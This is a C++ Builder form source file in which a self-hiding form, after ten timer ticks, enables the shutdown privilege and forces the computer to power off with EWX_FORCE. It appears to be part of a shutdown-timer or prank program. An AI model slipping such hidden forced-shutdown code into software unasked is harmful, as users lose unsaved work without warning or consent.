//---------------------------------------------------------------------------

#include <vcl.h>
#pragma hdrstop

#include "Unit3.h"
#include "main.h"
#include "Unit2.h"
//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma resource "*.dfm"
TForm3 *Form3;
//---------------------------------------------------------------------------
__fastcall TForm3::TForm3(TComponent* Owner)
        : TForm(Owner)
{
        flag=0;
}
//---------------------------------------------------------------------------

void __fastcall TForm3::Label1Click(TObject *Sender)
{
        Form3->Hide();
}
//---------------------------------------------------------------------------

void __fastcall TForm3::FormPaint(TObject *Sender)
{
         Label1Click(Sender);         
}
//---------------------------------------------------------------------------

void __fastcall TForm3::Timer1Timer(TObject *Sender)
{
         flag++;
        if(flag==10)
        {
        //�ػ�

        OSVERSIONINFO oi;
        oi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
        GetVersionEx(&oi);
        HANDLE handle;
        TOKEN_PRIVILEGES tkp;
        OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &handle);
        LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);

        tkp.PrivilegeCount = 1;  // one privilege to set
        tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        AdjustTokenPrivileges(handle, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);

        ExitWindowsEx(EWX_POWEROFF|EWX_FORCE, 0);
        exit(0);
        Form1->Close();
        Form2->Close();
        Form3->Close();
        
        
        }
}
//---------------------------------------------------------------------------
 